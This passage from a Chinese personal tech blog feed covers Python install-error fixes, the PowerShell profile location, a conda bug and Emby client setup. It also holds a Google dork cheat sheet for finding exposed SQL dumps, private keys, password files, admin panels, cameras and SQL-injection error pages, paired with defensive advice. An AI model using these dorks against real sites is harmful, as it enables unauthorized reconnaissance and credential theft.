        <content type="html"><![CDATA[<h1 id="python库报错汇总"><a href="#python库报错汇总" class="headerlink" title="python库报错汇总"></a>python库报错汇总</h1><p>形如<code>ModuleNotFoundError: No module named 'xxx'</code>的报错</p><p>首先先试一试<code>pip install xxx</code>能安装就能解决，没有就看下面，只是我遇到的</p><h2 id="ModuleNotFoundError-No-module-named-‘cv2’"><a href="#ModuleNotFoundError-No-module-named-‘cv2’" class="headerlink" title="ModuleNotFoundError: No module named ‘cv2’"></a>ModuleNotFoundError: No module named ‘cv2’</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> opencv-contrib-python <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ModuleNotFoundError-No-module-named-‘colour-io’-‘colour’-is-not-a-package"><a href="#ModuleNotFoundError-No-module-named-‘colour-io’-‘colour’-is-not-a-package" class="headerlink" title="ModuleNotFoundError: No module named ‘colour.io’; ‘colour’ is not a package"></a>ModuleNotFoundError: No module named ‘colour.io’; ‘colour’ is not a package</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> colour-science<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="No-module-named-‘cpuinfo’"><a href="#No-module-named-‘cpuinfo’" class="headerlink" title="No module named ‘cpuinfo’"></a>No module named ‘cpuinfo’</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> py-cpuinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ModuleNotFoundError-No-module-named-‘imageio‘"><a href="#ModuleNotFoundError-No-module-named-‘imageio‘" class="headerlink" title="ModuleNotFoundError: No module named ‘imageio‘"></a>ModuleNotFoundError: No module named ‘imageio‘</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> imgaug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="解决ModuleNotFoundError-No-module-named-‘skimage‘"><a href="#解决ModuleNotFoundError-No-module-named-‘skimage‘" class="headerlink" title="解决ModuleNotFoundError: No module named ‘skimage‘"></a>解决ModuleNotFoundError: No module named ‘skimage‘</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> scikit-image<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="No-module-named-‘open-clip‘"><a href="#No-module-named-‘open-clip‘" class="headerlink" title="No module named ‘open_clip‘"></a>No module named ‘open_clip‘</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> open_clip_torch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ERROR-No-matching-distribution-found-for-triton"><a href="#ERROR-No-matching-distribution-found-for-triton" class="headerlink" title="ERROR: No matching distribution found for triton"></a>ERROR: No matching distribution found for triton</h2><p>到<a href="https://hf-mirror.com/madbuda/triton-windows-builds">madbuda/triton-windows-builds · HF Mirror</a>下载对应windows构建包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> 下载目录pip <span class="token function">install</span> triton-3.0.0-cp311-cp311-win_amd64.whl  <span class="token comment"># 文件名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ImportError-cannot-import-name-‘soft-unicode‘-from-‘markupsafe‘"><a href="#ImportError-cannot-import-name-‘soft-unicode‘-from-‘markupsafe‘" class="headerlink" title="ImportError: cannot import name ‘soft_unicode‘ from ‘markupsafe‘"></a>ImportError: cannot import name ‘soft_unicode‘ from ‘markupsafe‘</h2><p>执行命令重新安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">markupsafe</span><span class="token operator">==</span><span class="token number">2.0</span>.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ERROR: Could not install packages due to an OSError: [WinError 5] 拒绝访问。： ‘E:\conda\envs\deepl\Lib\site-packages\cv2\cv2.pyd’ Consider using the <code>--user</code> option or check the permissions.</p><p>如他说添加<code>--user</code>参数</p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell配置目录</title>
      <link href="/2025/02/15/powershell-pei-zhi-mu-lu/"/>
      <url>/2025/02/15/powershell-pei-zhi-mu-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell配置目录"><a href="#powershell配置目录" class="headerlink" title="powershell配置目录"></a>powershell配置目录</h1><p>执行命令<code>$PROFILE</code>会得到类似于<code>C:\Users\xxx\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</code>的目录</p><p>这个目录的文件就是你的powershell预执行的命令，相当于每次启动powershell都行执行一遍</p><p>然后这个目录还会存powershell的安装的插件文件，备份这个文件，即使卸载重装配置也不会变，但是要注意不同版本命令可能不一样。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>conda在powershell7.5执行出现问题</title>
      <link href="/2025/02/15/conda-zai-powershell7.5-zhi-xing-chu-xian-wen-ti/"/>
      <url>/2025/02/15/conda-zai-powershell7.5-zhi-xing-chu-xian-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="conda在powershell7-5执行出现问题"><a href="#conda在powershell7-5执行出现问题" class="headerlink" title="conda在powershell7.5执行出现问题"></a>conda在powershell7.5执行出现问题</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>执行命令结果如下，不能达到预期</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">condausage: conda-script.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>--no-plugins<span class="token punctuation">]</span> <span class="token punctuation">[</span>-V<span class="token punctuation">]</span> COMMAND <span class="token punctuation">..</span>.conda-script.py: error: argument COMMAND: invalid choice: <span class="token string">''</span> <span class="token punctuation">(</span>choose from <span class="token string">'activate'</span>, <span class="token string">'clean'</span>, <span class="token string">'commands'</span>, <span class="token string">'compare'</span>, <span class="token string">'config'</span>, <span class="token string">'create'</span>, <span class="token string">'deactivate'</span>, <span class="token string">'env'</span>, <span class="token string">'export'</span>, <span class="token string">'info'</span>, <span class="token string">'init'</span>, <span class="token string">'install'</span>, <span class="token string">'list'</span>, <span class="token string">'notices'</span>, <span class="token string">'package'</span>, <span class="token string">'build'</span>, <span class="token string">'content-trust'</span>, <span class="token string">'convert'</span>, <span class="token string">'debug'</span>, <span class="token string">'develop'</span>, <span class="token string">'doctor'</span>, <span class="token string">'index'</span>, <span class="token string">'inspect'</span>, <span class="token string">'metapackage'</span>, <span class="token string">'render'</span>, <span class="token string">'repoquery'</span>, <span class="token string">'skeleton'</span>, <span class="token string">'pack'</span>, <span class="token string">'repo'</span>, <span class="token string">'token'</span>, <span class="token string">'server'</span>, <span class="token string">'remove'</span>, <span class="token string">'uninstall'</span>, <span class="token string">'rename'</span>, <span class="token string">'run'</span>, <span class="token string">'search'</span>, <span class="token string">'update'</span>, <span class="token string">'upgrade'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>升级版本后引起的问题，具体等修复</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>powershell版本降级，到<a href="https://github.com/PowerShell/PowerShell/releases/tag/v7.4.7">Release v7.4.7 Release of PowerShell · PowerShell/PowerShell</a>下载msi文件，安装老版本，7.5无所谓删不删，若要删除建议先备份”C:\Users\xxx\Documents\PowerShell”目录下的文件，这是所有配置文件，微软商店下载的powershell和github安装的powershell共用这个配置文件</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/PowerShell/PowerShell/issues/24942">标题： PowerShell 7.5.0 中的 Conda 环境激活问题 ·问题 #24942 ·PowerShell/PowerShell</a></p><p><a href="https://github.com/PowerShell/PowerShell/issues/24869">Conda does not run as expected on PowerShell 7.5.0 · Issue #24869 · PowerShell/PowerShell</a></p><p><a href="https://github.com/conda/conda/issues/14292">在 Powershell 7.5 预览版 4 上，在“conda activate base”之后，“Env：_CE_CONDA”和“Env：_CE_M”再次出现。·问题 #14292 ·conda/康达</a></p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> conda </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>emby使用</title>
      <link href="/2025/02/12/emby-shi-yong/"/>
      <url>/2025/02/12/emby-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="emby使用"><a href="#emby使用" class="headerlink" title="emby使用"></a>emby使用</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><ul><li><p>核对信息</p><p>确认你已获得完整的信息：</p><ul><li>服务器地址（通常为一个 URL 或 IP 地址）</li><li>端口号（如果提供了非默认端口，需要特别注意）</li><li>连接协议（通常为 http 或 https）</li><li>如有账号和密码或令牌信息，也要一并准备好</li></ul></li><li><p><strong>网络要求</strong><br>由于“机场节点”往往用于突破网络限制，确保你的设备已根据要求连接 VPN 或配置代理（如果提供方有说明需要）。</p></li></ul><hr><h2 id="2-在-Emby-客户端中添加服务器"><a href="#2-在-Emby-客户端中添加服务器" class="headerlink" title="2. 在 Emby 客户端中添加服务器"></a>2. 在 Emby 客户端中添加服务器</h2><h3 id="（1）安装-Emby-客户端"><a href="#（1）安装-Emby-客户端" class="headerlink" title="（1）安装 Emby 客户端"></a>（1）安装 Emby 客户端</h3><ul><li>到<a href="https://t.me/GentleSecretary">Telegram: Contact @GentleSecretary</a>搜索emby下载对应版本（首选）</li><li>在安卓手机上，可从 Google Play 商店或其他应用市场下载安装官方 Emby 客户端（这个需要开会员）</li><li>也可以使用第三方支持 Emby 协议的播放器（如 Infuse、Fileball 等）</li></ul><h3 id="（2）进入服务器设置"><a href="#（2）进入服务器设置" class="headerlink" title="（2）进入服务器设置"></a>（2）进入服务器设置</h3><ul><li>打开 Emby 客户端后，进入【设置】或【服务器设置】页面，或者直接弹出填写页面。</li><li>选择“添加服务器”或“连接到服务器”的选项。</li></ul><h3 id="（3）填写服务器地址"><a href="#（3）填写服务器地址" class="headerlink" title="（3）填写服务器地址"></a>（3）填写服务器地址</h3><ul><li><p>在“服务器地址”栏中输入你获得的地址，格式一般为：</p><ul><li><code>http://服务器地址:端口</code> 或者 <code>https://服务器地址:端口</code><br>例如，如果你的地址为 <code>http://123.45.67.89</code>，而端口为 8096，则填写：</li><li><code>http://123.45.67.89:8096</code></li></ul></li><li><p>注意：建议去除地址末尾多余的斜杠“/”，以免影响连接。（参考“线路说明”中对地址格式的建议 </p><p><a href="https://wiki.freeembyguide.eu.org/docs/guide/server">wiki.freeembyguide.eu.org</a>）</p></li></ul><h3 id="（4）连接测试"><a href="#（4）连接测试" class="headerlink" title="（4）连接测试"></a>（4）连接测试</h3><ul><li>填写后，点击“连接”或“测试连接”。</li><li>如果服务器运行正常且网络环境（或 VPN/代理）配置正确，客户端会自动加载媒体库。</li></ul><hr><h2 id="3-登录与账号验证"><a href="#3-登录与账号验证" class="headerlink" title="3. 登录与账号验证"></a>3. 登录与账号验证</h2><ul><li>如果该 Emby 机场服务要求身份验证，系统会提示你输入账号和密码。</li><li>输入正确的账号信息后，继续操作即可访问媒体资源。</li></ul><hr><h2 id="4-高级设置（仅适用于管理人员或自建服务器）"><a href="#4-高级设置（仅适用于管理人员或自建服务器）" class="headerlink" title="4. 高级设置（仅适用于管理人员或自建服务器）"></a>4. 高级设置（仅适用于管理人员或自建服务器）</h2><p>如果你自己搭建 Emby 服务器并挂接了硬盘存储，可能还需要：</p><ul><li><p>配置媒体库</p><p>在 Emby 服务器管理后台，设置媒体库的路径为硬盘挂载目录。这样服务器才能正确扫描并整理硬盘中的影音文件。（更多细节可参考 CSDN 上关于挂接硬盘的说明 </p><p><a href="https://wenku.csdn.net/answer/7f9bf651623542dea45bafc64aed261c">wenku.csdn.net</a>）</p></li><li><p><strong>网络加速和直连设置</strong><br>有些机场节点提供多条优化线路（直连或代理），如果遇到播放卡顿或加载慢的情况，可尝试切换线路或调整客户端的播放质量设置。</p></li></ul><hr><h2 id="5-常见问题及排查"><a href="#5-常见问题及排查" class="headerlink" title="5. 常见问题及排查"></a>5. 常见问题及排查</h2><ul><li>无法连接服务器<ul><li>检查网络环境，确保已开启必要的 VPN/代理。</li><li>再次核对地址和端口是否输入正确。</li></ul></li><li>播放卡顿或加载缓慢<ul><li>可能与服务器负载或网络带宽有关，尝试使用代理访问。</li><li>查看是否有备用线路，或者联系服务提供方反馈问题。</li></ul></li><li>SSL 证书错误<ul><li>如果使用 https 出现证书问题，确认是否需要手动安装信任证书，或联系服务提供方了解详细要求。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> emby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hacking使用-改进版</title>
      <link href="/2025/02/11/google-hacking-shi-yong-gai-jin-ban/"/>
      <url>/2025/02/11/google-hacking-shi-yong-gai-jin-ban/</url>
      
        <content type="html"><![CDATA[<h1 id="google-hacking使用-改进版"><a href="#google-hacking使用-改进版" class="headerlink" title="google hacking使用-改进版"></a>google hacking使用-改进版</h1><p>以下是 <strong>Google Hacking 的完整语法列表</strong>和<strong>高级组合示例</strong>，涵盖渗透测试、信息收集、漏洞挖掘等场景的实用技巧。所有语法均基于 Google 搜索引擎的合法功能，但请严格遵守法律和道德规范。</p><hr><h3 id="一、完整-Google-Hacking-语法列表"><a href="#一、完整-Google-Hacking-语法列表" class="headerlink" title="一、完整 Google Hacking 语法列表"></a><strong>一、完整 Google Hacking 语法列表</strong></h3><h4 id="1-基础操作符"><a href="#1-基础操作符" class="headerlink" title="1. 基础操作符"></a><strong>1. 基础操作符</strong></h4><table><thead><tr><th align="left">操作符</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>site:</code></td><td align="left">限定搜索特定域名或子域名</td><td align="left"><code>site:example.com</code></td></tr><tr><td align="left"><code>intitle:</code></td><td align="left">标题包含关键词</td><td align="left"><code>intitle:"login"</code></td></tr><tr><td align="left"><code>allintitle:</code></td><td align="left">标题包含所有指定关键词</td><td align="left"><code>allintitle:"admin" "dashboard"</code></td></tr><tr><td align="left"><code>inurl:</code></td><td align="left">URL 路径包含关键词</td><td align="left"><code>inurl:/admin</code></td></tr><tr><td align="left"><code>allinurl:</code></td><td align="left">URL 路径包含所有指定关键词</td><td align="left"><code>allinurl:login.php?user=</code></td></tr><tr><td align="left"><code>filetype:</code></td><td align="left">搜索特定文件类型</td><td align="left"><code>filetype:pdf "confidential"</code></td></tr><tr><td align="left"><code>ext:</code></td><td align="left">按文件扩展名搜索（同 <code>filetype:</code>）</td><td align="left"><code>ext:sql "password"</code></td></tr><tr><td align="left"><code>intext:</code></td><td align="left">正文内容包含关键词</td><td align="left"><code>intext:"数据库密码"</code></td></tr><tr><td align="left"><code>allintext:</code></td><td align="left">正文包含所有指定关键词</td><td align="left"><code>allintext:"username" "password"</code></td></tr><tr><td align="left"><code>cache:</code></td><td align="left">查看 Google 缓存的页面</td><td align="left"><code>cache:example.com</code></td></tr><tr><td align="left"><code>related:</code></td><td align="left">查找类似网站</td><td align="left"><code>related:github.com</code></td></tr><tr><td align="left"><code>info:</code></td><td align="left">获取网站的 Google 摘要信息</td><td align="left"><code>info:example.com</code></td></tr><tr><td align="left"><code>define:</code></td><td align="left">搜索词语定义</td><td align="left"><code>define:SQL注入</code></td></tr></tbody></table><h4 id="2-逻辑操作符"><a href="#2-逻辑操作符" class="headerlink" title="2. 逻辑操作符"></a><strong>2. 逻辑操作符</strong></h4><table><thead><tr><th align="left">操作符</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>AND</code> 或空格</td><td align="left">同时满足多个条件</td><td align="left"><code>site:example.com 密码</code></td></tr><tr><td align="left"><code>OR</code></td><td align="left">满足任意一个条件</td><td align="left"><code>漏洞 OR 后门</code></td></tr><tr><td align="left"><code>-</code></td><td align="left">排除关键词</td><td align="left"><code>登录 -site:example.com</code></td></tr><tr><td align="left"><code>()</code></td><td align="left">组合复杂逻辑</td><td align="left"><code>(inurl:admin OR intitle:admin) -论坛</code></td></tr></tbody></table><h4 id="3-高级操作符"><a href="#3-高级操作符" class="headerlink" title="3. 高级操作符"></a><strong>3. 高级操作符</strong></h4><table><thead><tr><th align="left">操作符</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>*</code></td><td align="left">通配符（匹配任意字符）</td><td align="left"><code>"username:* password:*"</code></td></tr><tr><td align="left"><code>"..."</code></td><td align="left">精确匹配短语</td><td align="left"><code>"您的密码错误"</code></td></tr><tr><td align="left"><code>..</code></td><td align="left">数值范围搜索</td><td align="left"><code>价格 $100..$500</code></td></tr><tr><td align="left"><code>AROUND(N)</code></td><td align="left">关键词间距不超过 N 个词</td><td align="left"><code>"密码" AROUND(5) "泄露"</code></td></tr><tr><td align="left"><code>weather:</code></td><td align="left">搜索某地天气</td><td align="left"><code>weather:北京</code></td></tr><tr><td align="left"><code>stocks:</code></td><td align="left">搜索股票代码</td><td align="left"><code>stocks:GOOG</code></td></tr></tbody></table><h4 id="4-隐藏功能"><a href="#4-隐藏功能" class="headerlink" title="4. 隐藏功能"></a><strong>4. 隐藏功能</strong></h4><table><thead><tr><th align="left">功能</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><strong>时间筛选</strong></td><td align="left">限定时间范围（通过搜索工具栏）</td><td align="left">最近一年、自定义日期</td></tr><tr><td align="left"><strong>图片搜索</strong></td><td align="left">通过图片反向搜索敏感信息</td><td align="left">上传图片查找来源</td></tr><tr><td align="left"><strong>地图数据</strong></td><td align="left">搜索暴露的地理标记信息</td><td align="left"><code>intitle:"security camera" site:google.com/maps</code></td></tr></tbody></table><hr><h3 id="二、组合示例大全（按场景分类）"><a href="#二、组合示例大全（按场景分类）" class="headerlink" title="二、组合示例大全（按场景分类）"></a><strong>二、组合示例大全</strong>（按场景分类）</h3><h4 id="1-敏感文件泄露"><a href="#1-敏感文件泄露" class="headerlink" title="1. 敏感文件泄露"></a><strong>1. 敏感文件泄露</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>数据库备份</strong></td><td align="left"><code>filetype:sql "DROP TABLE" site:example.com</code></td><td align="left">搜索 SQL 备份文件</td></tr><tr><td align="left"><strong>配置文件</strong></td><td align="left"><code>intitle:"index of" "config.php"</code></td><td align="left">查找 PHP 配置文件</td></tr><tr><td align="left"><strong>日志文件</strong></td><td align="left"><code>ext:log "error" "password"</code></td><td align="left">包含密码的日志文件</td></tr><tr><td align="left"><strong>密钥文件</strong></td><td align="left"><code>filetype:key private</code></td><td align="left">私钥文件泄露</td></tr></tbody></table><h4 id="2-后台与登录页面"><a href="#2-后台与登录页面" class="headerlink" title="2. 后台与登录页面"></a><strong>2. 后台与登录页面</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>管理员后台</strong></td><td align="left"><code>intitle:"admin login" inurl:/admin</code></td><td align="left">未授权访问的管理页面</td></tr><tr><td align="left"><strong>默认密码</strong></td><td align="left"><code>"默认密码" site:routerlogin.net</code></td><td align="left">设备默认凭据</td></tr><tr><td align="left"><strong>弱口令提示</strong></td><td align="left"><code>intext:"用户名或密码错误" inurl:login</code></td><td align="left">登录页面错误信息</td></tr></tbody></table><h4 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a><strong>3. 漏洞利用</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>SQL 注入点</strong></td><td align="left"><code>inurl:"id=" &amp; intext:"Warning: mysql"</code></td><td align="left">存在报错信息的注入点</td></tr><tr><td align="left"><strong>目录遍历</strong></td><td align="left"><code>intitle:"index of /" "parent directory"</code></td><td align="left">开放目录列表</td></tr><tr><td align="left"><strong>API 接口暴露</strong></td><td align="left"><code>inurl:/api/v1 intext:"apikey"</code></td><td align="left">泄露的 API 密钥</td></tr></tbody></table><h4 id="4-设备与系统"><a href="#4-设备与系统" class="headerlink" title="4. 设备与系统"></a><strong>4. 设备与系统</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>网络摄像头</strong></td><td align="left"><code>inurl:/view.shtml intitle:"Live View"</code></td><td align="left">公开的摄像头流</td></tr><tr><td align="left"><strong>路由器管理</strong></td><td align="left"><code>intitle:"RouterOS" "admin"</code></td><td align="left">未授权的路由器配置页面</td></tr><tr><td align="left"><strong>打印机控制台</strong></td><td align="left"><code>inurl:"/hp/device/this.LCDispatcher"</code></td><td align="left">惠普打印机管理界面</td></tr></tbody></table><h4 id="5-开源情报（OSINT）"><a href="#5-开源情报（OSINT）" class="headerlink" title="5. 开源情报（OSINT）"></a><strong>5. 开源情报（OSINT）</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>员工信息</strong></td><td align="left"><code>site:linkedin.com "CTO" "example.com"</code></td><td align="left">通过 LinkedIn 收集员工职位</td></tr><tr><td align="left"><strong>文档元数据</strong></td><td align="left"><code>filetype:docx "作者：张三"</code></td><td align="left">从 Office 文档提取创建者信息</td></tr><tr><td align="left"><strong>GitHub 泄露</strong></td><td align="left"><code>"github.com" "password" extension:env</code></td><td align="left">GitHub 中的敏感环境变量文件</td></tr></tbody></table><h4 id="6-错误信息泄露"><a href="#6-错误信息泄露" class="headerlink" title="6. 错误信息泄露"></a><strong>6. 错误信息泄露</strong></h4><table><thead><tr><th align="left">场景</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>调试模式</strong></td><td align="left"><code>intext:"DEBUG MODE" "PHP"</code></td><td align="left">开启调试模式的网站</td></tr><tr><td align="left"><strong>数据库报错</strong></td><td align="left"><code>"ORA-12541: TNS 无监听程序"</code></td><td align="left">Oracle 数据库错误信息</td></tr><tr><td align="left"><strong>堆栈跟踪</strong></td><td align="left"><code>intext:"at java.lang.Thread"</code></td><td align="left">Java 应用崩溃日志</td></tr></tbody></table><hr><h3 id="三、高阶组合技巧"><a href="#三、高阶组合技巧" class="headerlink" title="三、高阶组合技巧"></a><strong>三、高阶组合技巧</strong></h3><h4 id="1-通配符与模糊搜索"><a href="#1-通配符与模糊搜索" class="headerlink" title="1. 通配符与模糊搜索"></a><strong>1. 通配符与模糊搜索</strong></h4><ul><li>搜索带参数的 URL：<br><code>inurl:*.php?id= *</code></li><li>查找密码重置链接：<br><code>"password reset" site:example.com inurl:token=*</code></li></ul><h4 id="2-时间范围限定"><a href="#2-时间范围限定" class="headerlink" title="2. 时间范围限定"></a><strong>2. 时间范围限定</strong></h4><ul><li>查找近期泄露的数据库：<br><code>filetype:sql "INSERT INTO users" after:2023-01-01</code></li></ul><h4 id="3-混合逻辑精准定位"><a href="#3-混合逻辑精准定位" class="headerlink" title="3. 混合逻辑精准定位"></a><strong>3. 混合逻辑精准定位</strong></h4><ul><li>排除干扰结果：<br><code>(intitle:"管理后台" OR inurl:/admin) -site:gov.cn</code></li><li>组合文件类型与关键词：<br><code>filetype:xls "员工工资" site:example.com</code></li></ul><h4 id="4-利用错误消息"><a href="#4-利用错误消息" class="headerlink" title="4. 利用错误消息"></a><strong>4. 利用错误消息</strong></h4><ul><li>发现 SQL 注入漏洞：<br><code>"You have an error in your SQL syntax"</code></li><li>识别配置错误：<br><code>"Access denied for user 'root'@'localhost'"</code></li></ul><hr><h3 id="四、防御建议（补充）"><a href="#四、防御建议（补充）" class="headerlink" title="四、防御建议（补充）"></a><strong>四、防御建议（补充）</strong></h3><ol><li><strong>robots.txt 配置</strong>：禁止爬虫访问敏感路径（如 <code>/admin</code>、<code>/config</code>）。</li><li><strong>文件权限控制</strong>：避免将备份文件（<code>.bak</code>、<code>.sql</code>）存放在 Web 目录。</li><li><strong>错误信息隐藏</strong>：自定义错误页面，避免暴露堆栈跟踪。</li><li><strong>定期搜索自身</strong>：用 <code>site:yourdomain.com</code> 检查公开信息泄露。</li></ol><hr><h3 id="五、工具增强"><a href="#五、工具增强" class="headerlink" title="五、工具增强"></a><strong>五、工具增强</strong></h3><ul><li><strong>Google Dork 自动化</strong>：<ul><li><a href="https://www.exploit-db.com/google-hacking-database">GHDB</a>：直接搜索预定义的漏洞语法。</li><li><a href="https://github.com/...">DorkGenius</a>：自动生成高级 Dork 语句。</li></ul></li><li><strong>监控与告警</strong>：<ul><li>使用 <code>Google Alerts</code> 监控公司关键词（如 <code>site:example.com password</code>）。</li></ul></li></ul><hr><h3 id="六、合法与道德提醒"><a href="#六、合法与道德提醒" class="headerlink" title="六、合法与道德提醒"></a><strong>六、合法与道德提醒</strong></h3><ul><li><strong>仅用于授权测试</strong>：渗透前需获得书面许可。</li><li><strong>漏洞报告</strong>：发现漏洞后联系管理员，参考《<a href="https://www.rfc-editor.org/rfc/rfc9116">漏洞披露规范</a>》。</li><li><strong>避免敏感数据</strong>：示例中的关键词均为演示用途，请勿针对真实系统测试。</li></ul><h3 id="七、语法解析与示例"><a href="#七、语法解析与示例" class="headerlink" title="七、语法解析与示例"></a>七、<strong>语法解析与示例</strong></h3><h4 id="1-index-of-admin"><a href="#1-index-of-admin" class="headerlink" title="1. index of /admin"></a><strong>1. <code>index of /admin</code></strong></h4><ul><li><strong>用途</strong>：搜索开放目录列表中的 <code>/admin</code> 目录（常见管理后台路径）。</li><li><strong>风险</strong>：暴露后台登录页面、未授权访问管理界面。</li><li><strong>防御</strong>：禁用目录列表（Apache: <code>Options -Indexes</code>），设置访问权限（如 IP 白名单）。</li></ul><h4 id="2-index-of-passwd"><a href="#2-index-of-passwd" class="headerlink" title="2. index of /passwd"></a><strong>2. <code>index of /passwd</code></strong></h4><ul><li><strong>用途</strong>：查找 Unix/Linux 系统中的 <code>/etc/passwd</code> 文件（用户账户信息）。</li><li><strong>风险</strong>：泄露用户名、UID/GID 等敏感信息（现代系统密码存储在 <code>/etc/shadow</code>）。</li><li><strong>防御</strong>：确保 <code>/etc/passwd</code> 文件权限为 <code>644</code>，禁止 Web 访问系统文件。</li></ul><h4 id="3-index-of-password"><a href="#3-index-of-password" class="headerlink" title="3. index of /password"></a><strong>3. <code>index of /password</code></strong></h4><ul><li><strong>用途</strong>：搜索包含 “password” 关键词的目录或文件（如明文密码文件）。</li><li><strong>风险</strong>：直接获取明文密码或哈希值。</li><li><strong>防御</strong>：避免在代码或文件中明文存储密码，使用环境变量或密钥管理服务。</li></ul><h4 id="4-index-of-mail"><a href="#4-index-of-mail" class="headerlink" title="4. index of /mail"></a><strong>4. <code>index of /mail</code></strong></h4><ul><li><strong>用途</strong>：查找邮件服务器或邮件存储目录（如 <code>/var/mail</code>）。</li><li><strong>风险</strong>：泄露用户邮件内容、账户信息。</li><li><strong>防御</strong>：限制邮件目录的 Web 访问权限，加密存储敏感数据。</li></ul><h4 id="5-“index-of-“-passwd"><a href="#5-“index-of-“-passwd" class="headerlink" title="5. “index of /“ +passwd"></a><strong>5. <code>“index of /“ +passwd</code></strong></h4><ul><li><strong>用途</strong>：在根目录下搜索 <code>passwd</code> 文件。</li><li><strong>示例结果</strong>：可能发现 <code>/etc/passwd</code> 被错误链接到 Web 根目录。</li><li><strong>防御</strong>：检查 Web 目录中是否存在符号链接到系统文件。</li></ul><h4 id="6-“index-of-“-password-txt"><a href="#6-“index-of-“-password-txt" class="headerlink" title="6. “index of /“ +password.txt"></a><strong>6. <code>“index of /“ +password.txt</code></strong></h4><ul><li><strong>用途</strong>：查找 Web 根目录下的 <code>password.txt</code> 文件。</li><li><strong>风险</strong>：明文密码文件可直接下载。</li><li><strong>防御</strong>：删除测试或临时文件，禁用目录列表。</li></ul><h4 id="7-“index-of-“-htaccess"><a href="#7-“index-of-“-htaccess" class="headerlink" title="7. “index of /“ +.htaccess"></a><strong>7. <code>“index of /“ +.htaccess</code></strong></h4><ul><li><strong>用途</strong>：暴露 Apache 服务器的 <code>.htaccess</code> 配置文件。</li><li><strong>风险</strong>：泄露重定向规则、认证凭据（如 <code>AuthUserFile</code> 路径）。</li><li><strong>防御</strong>：限制 <code>.htaccess</code> 文件权限（如 <code>600</code>），避免存储敏感信息。</li></ul><h4 id="8-“index-of-root”"><a href="#8-“index-of-root”" class="headerlink" title="8. “index of /root”"></a><strong>8. <code>“index of /root”</code></strong></h4><ul><li><strong>用途</strong>：搜索 Unix 系统超级用户（root）的主目录。</li><li><strong>风险</strong>：泄露 root 用户的 SSH 密钥、脚本或日志。</li><li><strong>防御</strong>：确保 <code>/root</code> 目录权限为 <code>700</code>，禁止 Web 服务器访问。</li></ul><h4 id="9-“index-of-cgi-bin”"><a href="#9-“index-of-cgi-bin”" class="headerlink" title="9. “index of /cgi-bin”"></a><strong>9. <code>“index of /cgi-bin”</code></strong></h4><ul><li><strong>用途</strong>：查找 CGI 